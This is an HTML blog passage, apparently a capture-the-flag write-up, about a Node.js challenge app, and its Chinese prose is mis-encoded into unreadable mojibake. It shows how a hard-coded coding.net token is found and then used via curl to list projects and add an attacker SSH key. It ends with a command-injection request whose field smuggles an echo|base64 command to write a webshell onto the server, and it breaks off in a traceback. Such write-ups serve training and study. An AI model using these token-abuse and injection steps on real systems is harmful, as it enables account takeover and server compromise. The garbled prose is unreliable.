class="comment">// é€šè¿‡ filePath å¼•å…¥</span></span><br><span class="line">    <span class="keyword">const</span> api     = <span class="built_in">require</span>(filePath)</span><br><span class="line">    <span class="comment">// API åç§°</span></span><br><span class="line">    <span class="keyword">const</span> apiName = <span class="title function_">getApiName</span>(filePath)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// éå†è¯·æ±‚æ–¹å¼</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> type <span class="keyword">of</span> <span class="title class_">Object</span>.<span class="title function_">keys</span>(api)) &#123;</span><br><span class="line">        <span class="comment">// å“åº”æ“ä½œ å†™å…¥ router </span></span><br><span class="line">        router[type](apiName, <span class="keyword">async</span> (ctx) =&gt; &#123;</span><br><span class="line">            <span class="keyword">await</span> api[type](<span class="title function_">getRequest</span>(ctx), <span class="keyword">new</span> <span class="title class_">Response</span>(ctx))</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="comment">// æ‰“å°æ¥å£ä¿¡æ¯</span></span><br><span class="line">        <span class="title function_">apiLog</span>(type, apiName)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å»æ‰ .js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getApiName</span>(<span class="params">filePath</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> filePath.<span class="title function_">cutEnd</span>(<span class="number">3</span>)</span><br><span class="line">        .<span class="title function_">replace</span>(apiPath, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        .<span class="title function_">replace</span>(<span class="regexp">/\\/g</span>, <span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getRequest</span>(<span class="params">ctx</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        params : &#123; ...ctx.<span class="property">request</span>.<span class="property">body</span>, ...tools.<span class="title function_">getUrlParams</span>(ctx.<span class="property">request</span>.<span class="property">url</span>) &#125;,</span><br><span class="line">        page   : tools.<span class="title function_">getPagination</span>(ctx),</span><br><span class="line">        ctx,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">apiLog</span> (type, apiName, apiIntro = <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">info</span>(<span class="string">`<span class="subst">$&#123;apiIntro&#125;</span>\n[<span class="subst">$&#123;type.toUpperCase()&#125;</span>]: <span class="subst">$&#123;apiName&#125;</span>\n****************************************`</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// require æ—¶æ³¨å†Œ APIPATH</span></span><br><span class="line"><span class="title function_">registeApi</span>(apiPath)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = (<span class="function">() =&gt;</span> router.<span class="title function_">routes</span>())()</span><br></pre></td></tr></table></figure><h3 id="æ•´ç†é€»è¾‘-å‘ç°ç«¯å€ª"><a href="#æ•´ç†é€»è¾‘-å‘ç°ç«¯å€ª" class="headerlink" title="æ•´ç†é€»è¾‘ å‘ç°ç«¯å€ª"></a>æ•´ç†é€»è¾‘ å‘ç°ç«¯å€ª</h3><p>åœ¨ /api/XXX ä¸‹çš„ ä»»ä½• /api/path/to/api.js éƒ½ä¼šè¢«æ³¨å†Œæˆ /path/to/api </p><p>é‚£ä¹ˆ æŸ¥çœ‹ / ä¸‹çš„æ‰€æœ‰è¯·æ±‚å‡ºå»çš„ api ä½ å¯ä»¥ç›´æ¥ grep æ‹¿åˆ°å¦‚ä¸‹çš„æ•°æ®</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;https://fastly.jsdelivr.net/npm/axios@0.21.1/dist/axios.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">                axios.<span class="title function_">get</span>(<span class="string">&#x27;/v2/coding/projectList&#x27;</span>)</span><br><span class="line">                axios.<span class="title function_">get</span>(<span class="string">&#x27;/v2/coding/versionList&#x27;</span>, &#123;</span><br><span class="line">                axios.<span class="title function_">get</span>(<span class="string">&#x27;/v2/coding/distList&#x27;</span>, &#123;</span><br><span class="line">                <span class="keyword">return</span> (<span class="keyword">await</span> axios.<span class="title function_">get</span>(<span class="string">&#x27;/v2/coding/distExist&#x27;</span>, &#123;</span><br></pre></td></tr></table></figure><p>ä¸€å…± 4 ä¸ª api </p><blockquote><p>æ— è®ºæ˜¯å“ªä¸ª api ä½ éƒ½å¯ä»¥è¿›è¡Œè·Ÿè¸ª</p></blockquote><p>ä¾‹å¦‚ç¬¬äºŒä¸ª api <code>/v2/coding/versionList</code> æ‰€åœ¨çš„ä½ç½®æ ¹æ®ä¸Šé¢ middleware/api çš„æ¨æ–­</p><p>å¯ä»¥å‘ç°æ”¾åœ¨äº†å¦‚ä¸‹çš„ä½ç½®</p><blockquote><p>å–œæ¬¢å†™æ³¨é‡ŠçœŸæ˜¯å¥½ç¨‹åºå‘˜ (ç¡®ä¿¡)</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/api/v2/coding/versionList.js</span><br></pre></td></tr></table></figure><p>è®¿é—®åæˆ‘ä»¬å¯ä»¥å¾—åˆ°å¦‚ä¸‹çš„ js æ–‡ä»¶</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> coding = <span class="built_in">require</span>(<span class="string">&#x27;../../../request/coding&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> distExtname = [</span><br><span class="line">    <span class="string">&#x27;.tgz&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;.exe&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;.dmg&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;.AppImage&#x27;</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">    <span class="keyword">async</span> <span class="title function_">get</span>(<span class="params">request, response</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> <span class="title class_">ProjectId</span> = <span class="title class_">Number</span>(request.<span class="property">params</span>.<span class="property">ProjectId</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> data = []</span><br><span class="line"><span class="comment">// post to ä¸€ä¸ªåç«¯ </span></span><br><span class="line">        <span class="keyword">const</span> storeList = (<span class="keyword">await</span> coding.<span class="title function_">post</span>(<span class="string">&#x27;/open-api&#x27;</span>, &#123;</span><br><span class="line">            <span class="title class_">Action</span>: <span class="string">&#x27;DescribeProjectDepotInfoList&#x27;</span>,</span><br><span class="line">            <span class="title class_">ProjectId</span>,</span><br><span class="line">        &#125;)).<span class="property">data</span>.<span class="property">Response</span>.<span class="property">DepotData</span>.<span class="property">Depots</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">const</span> store <span class="keyword">of</span> storeList) &#123;</span><br><span class="line">            <span class="keyword">const</span> versionList = (<span class="keyword">await</span> coding.<span class="title function_">post</span>(<span class="string">&#x27;/open-api&#x27;</span>, &#123;</span><br><span class="line">                <span class="title class_">Action</span>: <span class="string">&#x27;DescribeGitReleases&#x27;</span>,</span><br><span class="line">                <span class="title class_">DepotId</span>: <span class="title class_">Number</span>(store.<span class="property">Id</span>),</span><br><span class="line">                <span class="title class_">Status</span>: <span class="number">1</span>,</span><br><span class="line">                <span class="title class_">PageNumber</span>: <span class="number">1</span>,</span><br><span class="line">                <span class="title class_">PageSize</span>: <span class="number">100</span>,</span><br><span class="line">            &#125;)).<span class="property">data</span>.<span class="property">Response</span>.<span class="property">ReleasePageList</span>.<span class="property">Releases</span></span><br><span class="line"></span><br><span class="line">            data = [...data, ...versionList]</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        data.<span class="title function_">sort</span>(<span class="function">(<span class="params">a, b</span>) =&gt;</span> a.<span class="property">TagName</span> &lt; b.<span class="property">TagName</span> ? <span class="number">1</span> : -<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        response.<span class="title function_">setData</span>(data)</span><br><span class="line">        response.<span class="title function_">success</span>()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥å‘ç°ä»–æ˜¯å¦ä¸€ä¸ªåç«¯ api çš„ä»£ç† è€Œé‚£ä¸ªåç«¯å®šä¹‰åœ¨ request/coding ä¸­</p><h3 id="è·å¾—-token"><a href="#è·å¾—-token" class="headerlink" title="è·å¾— token"></a>è·å¾— token</h3><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ç›¸å¯¹çš„è·¯å¾„å¾—åˆ° url </p><p>è®¿é—® <a href="http://127.0.0.1/request/coding.js">http://127.0.0.1/request/coding.js</a> ä¸­è·å–</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> axios = <span class="built_in">require</span>(<span class="string">&#x27;axios&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Access Token</span></span><br><span class="line"><span class="keyword">const</span> codingToken = <span class="string">&#x27;token e(This_Is_real_Token)c&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> coding = axios.<span class="title function_">create</span>(&#123;</span><br><span class="line">    <span class="attr">baseURL</span>: <span class="string">&#x27;https://e.coding.net&#x27;</span>,</span><br><span class="line">    <span class="attr">headers</span>: &#123;</span><br><span class="line">        <span class="title class_">Authorization</span>: codingToken,</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = coding</span><br></pre></td></tr></table></figure><p>ç½‘ä¸Šæœç´¢ e.coding.net  å‘ç°æ˜¯ä¸€ä¸ª devops å¹³å° å…·æœ‰ç›¸å½“çš„åˆ©ç”¨ä»·å€¼</p><p>åŒæ—¶è¿™é‡Œä¹Ÿæš´éœ²äº† å¯¹åº”çš„ Token</p><h3 id="æ¥ç®¡ç”¨æˆ·è´¦æˆ·"><a href="#æ¥ç®¡ç”¨æˆ·è´¦æˆ·" class="headerlink" title="æ¥ç®¡ç”¨æˆ·è´¦æˆ·"></a>æ¥ç®¡ç”¨æˆ·è´¦æˆ·</h3><p>è¿›ä¸€æ­¥ä½¿ç”¨æœç´¢å¼•æ“å¯ä»¥å‘ç°å¯¹åº”çš„ openapi æ–‡æ¡£ <a href="https://coding.net/help/openapi">https://coding.net/help/openapi</a></p><blockquote><p>å¦‚æœå‘ç°äº†é¡¹ç›® <a href="https://github.com/Esonhugh/tencent-coding-openapi/">https://github.com/Esonhugh/tencent-coding-openapi/</a></p><p>è¿™é‡Œæä¾›äº†éå¸¸æ–¹ä¾¿çš„åˆ©ç”¨å·¥å…· å¯ä»¥ä¸€é”®åˆ—å‡ºé¡¹ç›®å’Œä»“åº“ å¹¶ä¸”å¯ä»¥å¢åŠ  ssh keys åªéœ€è¦å¯¼å…¥ä¸€ä¸ª api token å³å¯ã€‚</p></blockquote><p>å‘ç°æ˜¯ä¸ªäºº api ï¼ˆtoken å¼€å¤´ï¼‰</p><p>åˆ—å‡ºé¡¹ç›®</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">curl https://e.coding.net/open-api -H <span class="string">&quot;Authorization: token e(This_Is_real_Token)c&quot;</span> -d <span class="string">&#x27;&#123;</span></span><br><span class="line"><span class="string">  &quot;Action&quot;: &quot;DescribeCodingProjects&quot;,</span></span><br><span class="line"><span class="string">  &quot;PageNumber&quot;: 1,</span></span><br><span class="line"><span class="string">  &quot;PageSize&quot;: 10</span></span><br><span class="line"><span class="string">&#125;&#x27;</span></span><br><span class="line"><span class="comment"># python usage</span></span><br><span class="line">python ./digging-shell.py list_projects</span><br><span class="line">ic| r.status_code: 200</span><br><span class="line">ic| r.headers: Headers(&#123;<span class="string">&#x27;server&#x27;</span>: <span class="string">&#x27;Nginx&#x27;</span>, <span class="string">&#x27;date&#x27;</span>: <span class="string">&#x27;Mon, 17 Apr 2023 11:04:54 GMT&#x27;</span>, <span class="string">&#x27;content-type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>, <span class="string">&#x27;transfer-encoding&#x27;</span>: <span class="string">&#x27;chunked&#x27;</span>, <span class="string">&#x27;connection&#x27;</span>: <span class="string">&#x27;keep-alive&#x27;</span>, <span class="string">&#x27;content-encoding&#x27;</span>: <span class="string">&#x27;gzip&#x27;</span>, <span class="string">&#x27;x-target-env&#x27;</span>: <span class="string">&#x27;prod_with_canary&#x27;</span>&#125;)</span><br></pre></td></tr></table></figure><p>Response</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;Response&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;RequestId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;10bcd5a9-7d9a-4a80-a1ec-e833d4c89d77&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Data&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;PageNumber&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;PageSize&quot;</span><span class="punctuation">:</span> <span class="number">10</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;TotalCount&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;ProjectList&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;Id&quot;</span><span class="punctuation">:</span> <span class="number">11680350</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;CreatedAt&quot;</span><span class="punctuation">:</span> <span class="number">1678157689000</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;UpdatedAt&quot;</span><span class="punctuation">:</span> <span class="number">1678157689000</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;Status&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;Type&quot;</span><span class="punctuation">:</span> <span class="number">2</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;MaxMember&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;Name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;leak-token-leak-git&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;DisplayName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;leak my git&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;Description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Wow! you got there! SuperCool man!&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;Icon&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://e.coding.net/static/project_icon/scenery-version-2-10.svg&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;TeamOwnerId&quot;</span><span class="punctuation">:</span> <span class="number">3921812</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;UserOwnerId&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;StartDate&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;EndDate&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;TeamId&quot;</span><span class="punctuation">:</span> <span class="number">3921812</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;IsDemo&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;Archived&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;ProgramIds&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>åˆ—å‡ºä»“åº“</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">curl https://e.coding.net/open-api -H <span class="string">&quot;Authorization: token e(This_Is_real_Token)c&quot;</span> -d <span class="string">&#x27;&#123;</span></span><br><span class="line"><span class="string">  &quot;Action&quot;: &quot;DescribeProjectDepotInfoList&quot;,</span></span><br><span class="line"><span class="string">  &quot;ProjectId&quot;: 11414022</span></span><br><span class="line"><span class="string">&#125;&#x27;</span></span><br><span class="line"><span class="comment"># python usage</span></span><br><span class="line">python ./digging-shell.py list_repos   </span><br><span class="line">ic| r.status_code: 200</span><br><span class="line">ic| r.headers: Headers(&#123;<span class="string">&#x27;server&#x27;</span>: <span class="string">&#x27;Nginx&#x27;</span>, <span class="string">&#x27;date&#x27;</span>: <span class="string">&#x27;Mon, 17 Apr 2023 11:04:00 GMT&#x27;</span>, <span class="string">&#x27;content-type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>, <span class="string">&#x27;transfer-encoding&#x27;</span>: <span class="string">&#x27;chunked&#x27;</span>, <span class="string">&#x27;connection&#x27;</span>: <span class="string">&#x27;keep-alive&#x27;</span>, <span class="string">&#x27;content-encoding&#x27;</span>: <span class="string">&#x27;gzip&#x27;</span>, <span class="string">&#x27;x-target-env&#x27;</span>: <span class="string">&#x27;prod_with_canary&#x27;</span>&#125;)</span><br></pre></td></tr></table></figure><p>Response</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;Response&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;RequestId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1b4dee8f-afce-4495-8e8b-d776c8097397&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;DepotData&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Depots&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;Id&quot;</span><span class="punctuation">:</span> <span class="number">10467875</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;Name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;leak-source-code&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;HttpsUrl&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://e.coding.net/vuln-git/leak-token-leak-git/leak-source-code.git&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;ProjectId&quot;</span><span class="punctuation">:</span> <span class="number">11680350</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;SshUrl&quot;</span><span class="punctuation">:</span> <span class="string">&quot;git@e.coding.net:vuln-git/leak-token-leak-git/leak-source-code.git&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;WebUrl&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://vuln-git.coding.net/p/leak-token-leak-git/d/leak-source-code&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;VcsType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;git&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;ProjectName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;leak-token-leak-git&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;Description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Got there!&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;CreatedAt&quot;</span><span class="punctuation">:</span> <span class="number">1678157728000</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;LastPushAt&quot;</span><span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Page&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;PageNumber&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;PageSize&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;TotalPage&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;TotalRow&quot;</span><span class="punctuation">:</span> <span class="number">1</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>å‘ç°è¦ç™»é™† å°è¯•è·å– sshkey</p><p>åˆ›å»º sshkey</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">curl https://e.coding.net/open-api -H <span class="string">&quot;Authorization: token e(This_Is_real_Token)c&quot;</span> -d <span class="string">&#x27;&#123;</span></span><br><span class="line"><span class="string">  &quot;Action&quot;: &quot;CreateSshKey&quot;,</span></span><br><span class="line"><span class="string">  &quot;Title&quot;: &quot;Hacker&quot;,</span></span><br><span class="line"><span class="string">  &quot;Content&quot;: &quot;ssh-rsa AAAA== rsatest&quot;,</span></span><br><span class="line"><span class="string">  &quot;ExpirationDate&quot;: &quot;9999-12-31&quot;</span></span><br><span class="line"><span class="string">&#125;&#x27;</span></span><br><span class="line"><span class="comment"># python usage</span></span><br><span class="line">python ./digging-shell.py add_ssh_key sshkey.rsa</span><br></pre></td></tr></table></figure><p>æˆåŠŸå <code>git clone git@e.coding.net:XXXXX/XXXX/XXXX.git</code></p><h3 id="é¡¹ç›®æºä»£ç "><a href="#é¡¹ç›®æºä»£ç " class="headerlink" title="é¡¹ç›®æºä»£ç "></a>é¡¹ç›®æºä»£ç </h3><p>è¿›è¡Œå®¡è®¡ã€‚ æŠŠèµ·æ¥é¡¹ç›®è·‘èµ·æ¥ã€‚</p><p>å¯ä»¥åœ¨ api æ–‡ä»¶å¤¹ä¸­æ‰¾åˆ°ä¸€ä¸ª /v3/UpdateAllProduct.js æ–‡ä»¶ è¿™ä¸ªæ–‡ä»¶ä¹Ÿæ˜¯å¯ä»¥ä½¿ç”¨çš„ api åœ¨ html ä¸»é¡µä¸­å¯ä»¥æ‰¾åˆ°å¯¹åº”çš„æ–‡ä»¶æ³„æ¼ã€‚</p><p>å­˜åœ¨å‘½ä»¤æ³¨å…¥çš„å¯èƒ½ æ³¨å…¥éå¸¸çš„ç®€å• projectName ä¹‹ç±»çš„å‚æ•°éƒ½å¯ä»¥æ³¨å…¥ å› ä¸ºè¿™äº›æ˜¯ç›´æ¥æ‹¼æ¥è¿›å»çš„ã€‚</p><blockquote><p>æ­£å¼çš„é¢˜ç›®ç¯å¢ƒåº”è¯¥æ˜¯ç¦æ­¢åå‘ shell è¿æ¥å‡ºæ¥çš„</p><p>ç¬¬ä¸€ç§åŠæ³•æ˜¯çº¯ç²¹çš„æ— å›æ˜¾çš„å¸ƒå°”å‘½ä»¤æ³¨å…¥</p><p>ä½†æ˜¯è¿™é‡Œæ»¥ç”¨ä¸€ä¸‹ä»£ç ä¸­çš„å­˜åœ¨çš„ js CGI é­”æ³• æˆ‘ä»¬å¯ä»¥å°è¯•å†™å…¥ä¸€ä¸ª webshell js æ¥è¿›è¡Œ Getshell </p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">use as curl</span></span><br><span class="line">curl &quot;https://127.0.0.1/v3/UpdateAllProduct&quot; \</span><br><span class="line">         -H &#x27;x-coding-event: ping1&#x27; \</span><br><span class="line">         -X POST -k \</span><br><span class="line">         --data-raw &quot;artifact.artifactRepoName=12&amp;artifact.artifactPkgName=\&quot;;echo $&#123;BASE64WEBSHELL&#125;|base64 -d &gt; /app/api/v2/badWebShell.js #\&quot;&amp;artifact.artifactVersionName=1.4&amp;artifact.projectName=testing&quot;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">python usage</span></span><br><span class="line">python digging-shell.py upload_shell ./upload_shell.js https://nodejs-hack.cloud.eson.ninja </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">https://nodejs-hack.cloud.eson.ninja replace your url ä¸è¦åŠ  / æˆ‘çš„æœåŠ¡æ˜¯ç¦æ­¢nodejs å¤–è¿å…¶ä»–æœåŠ¡ æ‰€ä»¥ä¼šå¯¼è‡´å†…éƒ¨çš„jsçš„å‘½ä»¤æ‹¼æ¥æ‰§è¡Œæ—¶å€™çš„ curl å¤±æ•ˆï¼Œå¯¼è‡´ä¸€æ¬¡ 500 ï¼Œå¦åˆ™ä¼šè¿”å›æœåŠ¡æ­£å¸¸æ›´æ–°çš„ json</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">output like following</span></span><br><span class="line">ic| file_data: &#x27;Y29uc3&lt;base64ed file data&gt;AAA=&#x27;</span><br><span class="line">Traceback (most recent call 